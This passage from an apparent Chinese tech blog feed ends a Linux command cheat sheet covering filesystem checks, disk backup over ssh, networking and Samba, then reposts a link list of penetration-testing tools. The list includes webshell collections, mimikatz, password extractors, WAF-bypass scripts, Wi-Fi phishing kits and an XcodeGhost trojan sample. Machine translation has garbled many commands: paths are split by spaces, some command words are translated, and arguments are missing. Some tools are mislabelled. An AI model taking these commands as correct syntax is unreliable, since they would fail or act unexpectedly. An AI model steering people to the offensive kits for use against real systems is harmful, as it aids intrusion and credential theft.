hda1修复/检查hda1磁盘上linux文件系统的完整性</p><p>fsck.ext2 / dev / hda1修复/检查hda1磁盘上ext2文件系统的完整性</p><p>e2fsck / dev / hda1修复/检查hda1磁盘上ext2文件系统的完整性</p><p>e2fsck -j / dev / hda1修复/检查hda1磁盘上ext3文件系统的完整性</p><p>fsck.ext3 / dev / hda1修复/检查hda1磁盘上ext3文件系统的完整性</p><p>fsck.vfat / dev / hda1修复/检查hda1磁盘上fat文件系统的完整性</p><p>fsck.msdos / dev / hda1修复/检查hda1磁盘上dos文件系统的完整性</p><p>dosfsck / dev / hda1修复/检查hda1磁盘上dos文件系统的完整性</p><h1 id="0x16-初始化一个文件系统"><a href="#0x16-初始化一个文件系统" class="headerlink" title="0x16 初始化一个文件系统"></a>0x16 <strong>初始化一个文件系统</strong></h1><p>mkfs / dev / hda1在hda1分区创建一个文件系统</p><p>mke2fs / dev / hda1在hda1分区创建一个linux ext2的文件系统</p><p>mke2fs -j / dev / hda1在hda1分区创建一个linux ext3（日志型）的文件系统</p><p>mkfs -t vfat 32 -F / dev / hda1创建一个FAT32文件系统</p><p>fdformat -n / dev / fd0格式化一个软盘</p><p>mkswap / dev / hda3创建一个swap文件系统</p><p>返回顶部索引^</p><p>SWAP文件系统</p><p>mkswap / dev / hda3创建一个swap文件系统</p><p>swapon / dev / hda3启用一个新的swap文件系统</p><p>swapon / dev / hda2 / dev / hdb3启用两个交换分区</p><h1 id="0x17-备份"><a href="#0x17-备份" class="headerlink" title="0x17 备份"></a>0x17 <strong>备份</strong></h1><p>dump -0aj -f /tmp/home0.bak / home制作一个’/ home’目录的完整备份</p><p>dump -1aj -f /tmp/home0.bak / home制作一个’/ home’目录的交互式备份</p><p>恢复-if /tmp/home0.bak还原一个交互式备份</p><p>rsync -rogpav –delete / home / tmp同步两边的目录</p><p>rsync -rogpav -e ssh –delete / home ip_address：/ tmp通过SSH通道rsync</p><p>rsync -az -e ssh –delete ip_addr：/ home / public / home / local通过ssh和压缩将一个远程目录同步到本地目录</p><p>rsync -az -e ssh –delete / home / local ip_addr：/ home / public通过ssh和压缩将本地目录同步到远程目录</p><p>dd bs = 1M if = / dev / hda | gzip | ssh user @ ip_addr’dd of = hda.gz’通过ssh在远程主机上执行一次备份本地磁盘的操作</p><p>dd if = / dev / sda = / tmp / file1备份磁盘内容到一个文件</p><p>tar -Puf backup.tar / home / user执行一次对’/ home / user’目录的交互式备份操作</p><p>（cd / tmp / local / &amp;&amp; tar c。）| ssh -C user @ ip_addr’cd / home / share / &amp;&amp; tar x -p’通过ssh在远程目录中复制一个目录内容</p><p>（tar c / home）| ssh -C user @ ip_addr’cd / home / backup-home &amp;&amp; tar x -p’通过ssh在远程目录中复制一个本地目录</p><p>tar cf - 。| （cd / tmp / backup; tar xf - ）本地将一个目录复制到另一个地方，保留原有权限及链接</p><p>find / home / user1 -name’* .txt’| xargs cp -av –target-directory = / home / backup / –parents从一个目录查找并复制所有以’.txt’结尾的文件到另一个目录</p><p>find / var / log -name’* .log’| tar cv –files-from = - | bzip2&gt; log.tar.bz2查找所有以’.log’结尾的文件并做成一个bzip包</p><p>dd if = / dev / hda of = / dev / fd0 bs = 512 count = 1做一个将MBR（Master Boot Record）内容复制到软盘的动作</p><p>dd if = / dev / fd0 of = / dev / hda bs = 512 count = 1从已经保存到软盘的备份中恢复MBR内容</p><h1 id="0x18-光盘"><a href="#0x18-光盘" class="headerlink" title="0x18 光盘"></a>0x18 <strong>光盘</strong></h1><p>cdrecord -v gracetime = 2 dev = / dev / cdrom -eject blank = fast -force清空一个可复写的光盘内容</p><p>mkisofs / dev / cdrom&gt; cd.iso在磁盘上创建一个光盘的iso镜像文件</p><p>mkisofs / dev / cdrom | gzip&gt; cd_iso.gz在磁盘上创建一个压缩了的光盘iso镜像文件</p><p>mkisofs -J -allow-leading-dots -R -V“Label CD”-iso-level 4 -o ./cd.iso data_cd创建一个目录的iso镜像文件</p><p>cdrecord -v dev = / dev / cdrom cd.iso刻录一个ISO镜像文件</p><p>gzip -dc cd_iso.gz | cdrecord dev = / dev / cdrom - 刻录一个压缩了的ISO镜像文件</p><p>mount -o loop cd.iso / mnt / iso挂载一个ISO镜像文件</p><p>cd-paranoia -B从一个CD光盘转录音轨到wav文件中</p><p>cd-paranoia - “-3”从一个CD光盘转录音轨到wav文件中（参数-3）</p><p>cdrecord –scanbus扫描总线以识别scsi通道</p><p>dd if = / dev / hdc | md5sum校验一个设备的md5sum编码，例如一张CD</p><h1 id="0x19-网络-（以太网和WIFI无线）"><a href="#0x19-网络-（以太网和WIFI无线）" class="headerlink" title="0x19 网络 - （以太网和WIFI无线）"></a>0x19 <strong>网络 - （以太网和WIFI无线）</strong></h1><p>ifconfig eth0显示一个以太网卡的配置</p><p>ifup eth0启用一个’eth0’网络设备</p><p>ifdown eth0禁用一个’eth0’网络设备</p><p>ifconfig eth0 192.168.1.1 netmask 255.255.255.0控制IP地址</p><p>ifconfig eth0 promisc设置’eth0’成混杂模式以嗅探数据包（sniffing）</p><p>dhclient eth0以dhcp模式启用’eth0’</p><p>route -n show routing table</p><p>route add -net 0/0 gw IP_Gateway configura默认网关</p><p>route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1配置静态路由到达网络’192.168.0.0/16’</p><p>route del 0/0 gw IP_gateway删除静态路由</p><p>echo“1”&gt; / proc / sys / net / ipv4 / ip_forward激活ip routing</p><p>hostname显示系统的主机名</p><p>主机<a href="http://www.example.com查找主机名将名称解析为IP地址，反之亦然（1）" target="_blank" rel="noopener">www.example.com查找主机名将名称解析为IP地址，反之亦然（1）</a></p><p>nslookup <a href="http://www.example.com查找主机名将名称解析为ip地址，反之亦然（2）" target="_blank" rel="noopener">www.example.com查找主机名将名称解析为ip地址，反之亦然（2）</a></p><p>ip link show显示所有接口的链接状态</p><p>mii-tool eth0显示’eth0’的链接状态</p><p>ethtool eth0显示网卡’eth0’的统计信息</p><p>netstat -tup显示所有活动网络连接及其PID</p><p>netstat -tupl显示监听系统及其PID的所有网络服务</p><p>tcpdump tcp端口80显示所有HTTP流量</p><p>iwlist扫描显示无线网络</p><p>iwconfig eth1显示无线网卡的配置</p><p>主机名显示主机名</p><p>托管<a href="http://www.example.com查找主机名，将名称解析为ip地址，反之亦然" target="_blank" rel="noopener">www.example.com查找主机名，将名称解析为ip地址，反之亦然</a></p><p>nslookup <a href="http://www.example.com查找主机名将名称解析为ip地址，反之亦然" target="_blank" rel="noopener">www.example.com查找主机名将名称解析为ip地址，反之亦然</a></p><p>whois <a href="http://www.example.com查找Whois数据库" target="_blank" rel="noopener">www.example.com查找Whois数据库</a></p><p>GO TOP INDEX ^</p><p>Microsoft Windows网络（SAMBA）</p><p>nbtscan ip_addr netbios名称解析</p><p>nmblookup -A ip_addr netbios名称解析</p><p>smbclient -L ip_addr / hostname显示Windows主机的远程共享</p><p>smbget -Rr smb：// ip_addr / share像wget可以通过smb从主机窗口下载文件</p><p>mount -t smbfs -o username = user，password = pass // WinClient / share / mnt / share挂载一个windows网络共享</p><hr>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试工具库</title>
      <link href="/2019/08/26/Python%E5%B7%A5%E5%85%B7%E5%BA%93/"/>
      <url>/2019/08/26/Python%E5%B7%A5%E5%85%B7%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>我们咋进行渗透测试的过程中，可能会用到很多的开源测试工具，但是一个个去寻找太过于繁琐了，索性tools论文中给我们整理好了，这里转载一下，也方便自己查看。</p><p>转载链接：<a href="https://www.t00ls.net/pytools.html" target="_blank" rel="noopener">https://www.t00ls.net/pytools.html</a></p><a id="more"></a><h1 id="0x01-漏洞及渗透练习平台"><a href="#0x01-漏洞及渗透练习平台" class="headerlink" title="0x01 漏洞及渗透练习平台"></a>0x01 漏洞及渗透练习平台</h1><p>WebGoat漏洞练习平台：</p><p><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></p><p>webgoat-legacy漏洞练习平台:</p><p><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat-Legacy</a></p><p>zvuldirll漏洞练习平台：</p><p><a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="noopener">https://github.com/710leo/ZVulDrill</a></p><p>vulapps漏洞练习平台：</p><p><a href="https://github.com/Medicean/VulApps" target="_blank" rel="noopener">https://github.com/Medicean/VulApps</a></p><p>dvwa漏洞练习平台：</p><p><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="noopener">https://github.com/RandomStorm/DVWA</a></p><p>数据库注入练习平台 ：</p><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><p>用node编写的漏洞练习平台，like OWASP Node Goat：</p><p><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="noopener">https://github.com/cr0hn/vulnerable-node</a></p><p>Ruby编写的一款工具，生成含漏洞的虚拟机：</p><p><a href="https://github.com/cliffe/secgen" target="_blank" rel="noopener">https://github.com/cliffe/secgen</a></p><h1 id="0x02-花式扫描器"><a href="#0x02-花式扫描器" class="headerlink" title="0x02 花式扫描器"></a>0x02 花式扫描器</h1><p>Nmap端口扫描器：</p><p><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a></p><p>本地网络扫描器：</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a></p><p>子域名扫描器：</p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><p><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></p><p><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a></p><p><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a></p><p>linux漏洞扫描：</p><p><a href="https://github.com/future-architect/vuls" target="_blank" rel="noopener">https://github.com/future-architect/vuls</a></p><p>基于端口扫描以及关联CVE:</p><p><a href="https://github.com/m0nad/HellRaiser" target="_blank" rel="noopener">https://github.com/m0nad/HellRaiser</a></p><p>漏洞路由扫描器：</p><p><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="noopener">https://github.com/jh00nbr/Routerhunter-2.0</a></p><p>迷你批量信息泄漏扫描脚本：</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p>Waf类型检测工具：</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p><p>服务器端口弱口令扫描器：</p><p><a href="https://github.com/wilson9x1/fenghuangscanner_v3" target="_blank" rel="noopener">https://github.com/wilson9x1/fenghuangscanner_v3</a></p><p>Fox-scan扫描器：</p><p><a href="https://github.com/fengxuangit/Fox-scan/" target="_blank" rel="noopener">https://github.com/fengxuangit/Fox-scan/</a></p><h1 id="0x03-信息搜集工具"><a href="#0x03-信息搜集工具" class="headerlink" title="0x03 信息搜集工具"></a>0x03 信息搜集工具</h1><p>社工收集器：</p><p><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a></p><p>Github信息搜集：</p><p><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a></p><p>github Repo信息搜集工具：</p><p><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p><p>信息探测及扫描工具：</p><p><a href="https://github.com/darryllane/Bluto" target="_blank" rel="noopener">https://github.com/darryllane/Bluto</a></p><p>内部网络信息扫描器：</p><p><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a></p><p>远程桌面登录扫描器：</p><p><a href="https://github.com/linuz/Sticky-Keys-Slayer" target="_blank" rel="noopener">https://github.com/linuz/Sticky-Keys-Slayer</a></p><p>网络基础设施渗透工具</p><p><a href="https://github.com/SECFORCE/sparta" target="_blank" rel="noopener">https://github.com/SECFORCE/sparta</a></p><p>SNMAP密码破解:</p><p><a href="https://github.com/SECFORCE/SNMP-Brute" target="_blank" rel="noopener">https://github.com/SECFORCE/SNMP-Brute</a></p><h1 id="0x04-WEB"><a href="#0x04-WEB" class="headerlink" title="0x04 WEB"></a>0x04 WEB</h1><p>webshell大合集：</p><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><p>渗透以及web攻击脚本：</p><p><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a></p><p>web渗透小工具大合集：</p><p><a href="https://github.com/rootphantomer/hack_tools_for_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hack<em>tools</em>for_me</a></p><p>XSS数据接收平台：</p><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><p>XSS与CSRF工具：</p><p><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a></p><p>xss多功能扫描器：</p><p><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a></p><p>web漏洞扫描器:</p><p><a href="https://github.com/andresriancho/w3af" target="_blank" rel="noopener">https://github.com/andresriancho/w3af</a></p><p>WEB漏洞扫描器：</p><p><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a></p><p>渗透常用小工具包：</p><p><a href="https://github.com/leonteale/pentestpackage" target="_blank" rel="noopener">https://github.com/leonteale/pentestpackage</a></p><p>web目录扫描器:</p><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><p>web向命令注入检测工具：</p><p><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p><p>自动化SQL注入检查工具：</p><p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p><p>SSL扫描器：</p><p><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a></p><p>安全工具集合：</p><p><a href="https://github.com/codejanus/ToolSuite" target="_blank" rel="noopener">https://github.com/codejanus/ToolSuite</a></p><p>apache日志分析器：</p><p><a href="https://github.com/mthbernardes/ARTLAS" target="_blank" rel="noopener">https://github.com/mthbernardes/ARTLAS</a></p><p>php代码审计工具：</p><p><a href="https://github.com/pwnsdx/BadCode" target="_blank" rel="noopener">https://github.com/pwnsdx/BadCode</a></p><p>web指纹识别扫描：</p><p><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a></p><p>检查网站恶意攻击：</p><p><a href="https://github.com/ciscocsirt/malspider" target="_blank" rel="noopener">https://github.com/ciscocsirt/malspider</a></p><p>wordprees漏洞扫描器：</p><p><a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">https://github.com/wpscanteam/wpscan</a></p><p>固件漏洞扫描器：</p><p><a href="https://github.com/misterch0c/firminator_backend" target="_blank" rel="noopener">https://github.com/misterch0c/firminator_backend</a></p><p>数据库注入工具</p><p><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p><p>Web代理：</p><p><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a></p><p>新版中国菜刀：</p><p><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p><p>git泄露利用EXP：</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p>浏览器攻击框架：</p><p><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p><p>自动化绕过WAF脚本：</p><p><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a></p><p><a href="https://github.com/owtf/wafbypasser" target="_blank" rel="noopener">https://github.com/owtf/wafbypasser</a></p><p>一款开源WAF：</p><p><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><p>http命令行客户端：</p><p><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a></p><p>浏览器调试利器：</p><p><a href="https://github.com/firebug/firebug" target="_blank" rel="noopener">https://github.com/firebug/firebug</a></p><p>DISCUZ漏洞扫描器：</p><p><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a></p><p>自动化代码审计工具</p><p><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">https://github.com/wufeifei/cobra</a></p><p>浏览器攻击框架：</p><p><a href="https://github.com/julienbedard/browsersploit" target="_blank" rel="noopener">https://github.com/julienbedard/browsersploit</a></p><p>tomcat自动后门部署：</p><p><a href="https://github.com/mgeeky/tomcatWarDeployer" target="_blank" rel="noopener">https://github.com/mgeeky/tomcatWarDeployer</a></p><p>网络空间指纹扫描器：</p><p><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a></p><p>burpsuit之J2EE扫描插件：</p><p><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">https://github.com/ilmila/J2EEScan</a></p><h1 id="0x05-windows域渗透工具"><a href="#0x05-windows域渗透工具" class="headerlink" title="0x05  windows域渗透工具"></a>0x05  windows域渗透工具</h1><p>mimikatz明文注入：</p><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p><p>Powershell渗透库合集：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>Powershell tools合集：</p><p><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="noopener">https://github.com/clymb3r/PowerShell</a></p><p>powershell的mimikittenz:</p><p><a href="https://github.com/putterpanda/mimikittenz" target="_blank" rel="noopener">https://github.com/putterpanda/mimikittenz</a></p><p>域渗透教程:</p><p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><h1 id="0x06-Fuzz"><a href="#0x06-Fuzz" class="headerlink" title="0x06 Fuzz"></a>0x06 Fuzz</h1><p>Web向Fuzz工具</p><p><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p><p>HTTP暴力破解，撞库攻击脚本</p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a></p><h1 id="0x07-漏洞利用及攻击框架"><a href="#0x07-漏洞利用及攻击框架" class="headerlink" title="0x07 漏洞利用及攻击框架"></a>0x07 漏洞利用及攻击框架</h1><p>msf框架：</p><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><p>pocsscan攻击框架：</p><p><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a></p><p>Pocsuite攻击框架:</p><p><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="noopener">https://github.com/knownsec/Pocsuite</a></p><p>Beebeeto攻击框架：</p><p><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="noopener">https://github.com/n0tr00t/Beebeeto-framework</a></p><h1 id="0x08-漏洞POC-amp-EXP"><a href="#0x08-漏洞POC-amp-EXP" class="headerlink" title="0x08 漏洞POC&amp;EXP"></a>0x08 漏洞POC&amp;EXP</h1><p>ExploitDB官方git版本:</p><p><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></p><p>php漏洞代码分析：</p><p><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a></p><p>CVE-2016-2107:</p><p><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p><p>CVE-2015-7547 POC：</p><p><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p><p>JAVA反序列化POC生成工具:</p><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><p>JAVA反序列化EXP:</p><p><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p><p>Jenkins CommonCollections EXP:</p><p><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p><p>CVE-2015-2426 EXP (windows内核提权):</p><p><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):</p><p><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p><p>php7缓存覆写漏洞Demo及相关工具:</p><p><a href="http://https//github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p>XcodeGhost木马样本:</p><p><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p><h1 id="0x09-中间人攻击及钓鱼"><a href="#0x09-中间人攻击及钓鱼" class="headerlink" title="0x09 中间人攻击及钓鱼"></a>0x09 中间人攻击及钓鱼</h1><p>中间人攻击框架:</p><p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></p><p><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy</a></p><p><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf</a></p><p>Inject code, jam wifi, and spy on wifi users:</p><p><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a></p><p>中间人代理工具:</p><p><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="noopener">https://github.com/intrepidusgroup/mallory</a></p><p>wifi钓鱼:</p><p><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="noopener">https://github.com/sophron/wifiphisher</a></p><h1 id="0x10-密码破解"><a href="#0x10-密码破解" class="headerlink" title="0x10 密码破解"></a>0x10 密码破解</h1><p>密码破解工具:</p><p><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a></p><p>本地存储的各类密码提取利器:</p><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h1 id="0x11-二进制及代码分析工具"><a href="#0x11-二进制及代码分析工具" class="headerlink" title="0x11 二进制及代码分析工具"></a>0x11 二进制及代码分析工具</h1><p>二进制分析工具</p><p><a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">https://github.com/devttys0/binwalk</a></p><p>系统扫描器</p><p><a href="https://github.com/quarkslab/binmap" target="_blank" rel="noopener">https://github.com/quarkslab/binmap</a></p><p>rp:</p><p><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p><p>Windows Exploit Development工具</p><p><a href="https://github.com/lillypad/badger" target="_blank" rel="noopener">https://github.com/lillypad/badger</a></p><h1 id="0x12-二进制静态分析工具（python）"><a href="#0x12-二进制静态分析工具（python）" class="headerlink" title="0x12 二进制静态分析工具（python）"></a>0x12 二进制静态分析工具（python）</h1><p><a href="https://github.com/bdcht/amoco" target="_blank" rel="noopener">https://github.com/bdcht/amoco</a></p><p>Python Exploit Development Assistance for GDB:</p><p><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p><p>对BillGates Linux Botnet系木马活动的监控工具</p><p><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="noopener">https://github.com/ValdikSS/billgates-botnet-tracker</a></p><p>木马配置参数提取工具:</p><p><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="noopener">https://github.com/kevthehermit/RATDecoders</a></p><p>Shellphish编写的二进制分析工具（CTF向）:</p><p><a href="https://github.com/angr/angr" target="_blank" rel="noopener">https://github.com/angr/angr</a></p><p>针对python的静态代码分析工具:</p><p><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="noopener">https://github.com/yinwang0/pysonar2</a></p><p>一个自动化的脚本（shell）分析工具，用来给出警告和建议:</p><p><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="noopener">https://github.com/koalaman/shellcheck</a></p><p>基于AST变换的简易Javascript反混淆辅助工具:</p><p><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="noopener">https://github.com/ChiChou/etacsufbo</a></p><h1 id="0x13-EXP编写框架及工具"><a href="#0x13-EXP编写框架及工具" class="headerlink" title="0x13 EXP编写框架及工具"></a>0x13 EXP编写框架及工具</h1><p>二进制EXP编写工具:</p><p><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="noopener">https://github.com/t00sh/rop-tool</a></p><p>CTF Pwn 类题目脚本编写框架:</p><p><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p><p>an easy-to-use io library for pwning development:</p><p><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a></p><p>跨平台注入工具:</p><p><a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a></p><p>哈希长度扩展攻击EXP：</p><p><a href="https://github.com/citronneur/rdpy" target="_blank" rel="noopener">https://github.com/citronneur/rdpy</a></p><h1 id="0x14-隐写"><a href="#0x14-隐写" class="headerlink" title="0x14 隐写"></a>0x14 隐写</h1><p>隐写检测工具</p><p><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="noopener">https://github.com/abeluck/stegdetect</a></p><h1 id="0x15-各类安全资料"><a href="#0x15-各类安全资料" class="headerlink" title="0x15 各类安全资料"></a>0x15 各类安全资料</h1><p>data_hacking合集:</p><p><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="noopener">https://github.com/ClickSecurity/data_hacking</a></p><p>mobile-security-wiki:</p><p><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="noopener">https://github.com/exploitprotocol/mobile-security-wiki</a></p><p>书籍《reverse-engineering-for-beginners》:</p><p><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="noopener">https://github.com/veficos/reverse-engineering-for-beginners</a></p><p>一些信息安全标准及设备配置:</p><p><a href="https://github.com/luyg24/IT_security" target="_blank" rel="noopener">https://github.com/luyg24/IT_security</a></p><p>APT相关笔记:</p><p><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="noopener">https://github.com/kbandla/APTnotes</a></p><p>Kcon资料:</p><p><a href="https://github.com/knownsec/KCon" target="_blank" rel="noopener">https://github.com/knownsec/KCon</a></p><p>《DO NOT FUCK WITH A HACKER》:</p><p><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="noopener">https://github.com/citypw/DNFWAH</a></p><p>各类安全脑洞图：</p><p><a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">https://github.com/phith0n/Mind-Map</a></p><p>信息安全流程图：</p><p><a href="https://github.com/SecWiki/sec-chart/" target="_blank" rel="noopener">https://github.com/SecWiki/sec-chart/ tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</a></p><h1 id="0x16-各类CTF资源"><a href="#0x16-各类CTF资源" class="headerlink" title="0x16 各类CTF资源"></a>0x16 各类CTF资源</h1><p>近年ctf writeup大全:</p><p><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2016</a></p><p><a href="https://github.com/ctfs/write-ups-2015" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015</a></p><p><a href="https://github.com/ctfs/write-ups-2014" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014</a></p><p>fbctf竞赛平台Demo:</p><p><a href="https://github.com/facebook/fbctf" target="_blank" rel="noopener">https://github.com/facebook/fbctf</a></p><p>ctf Resources:</p><p><a href="https://github.com/ctfs/resources" target="_blank" rel="noopener">https://github.com/ctfs/resources</a></p><p>ctf及黑客资源合集:</p><p><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p><p>ctf和安全工具大合集:</p><p><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p><p>ctf向 python工具包</p><p><a href="https://github.com/P1kachu/v0lt" target="_blank" 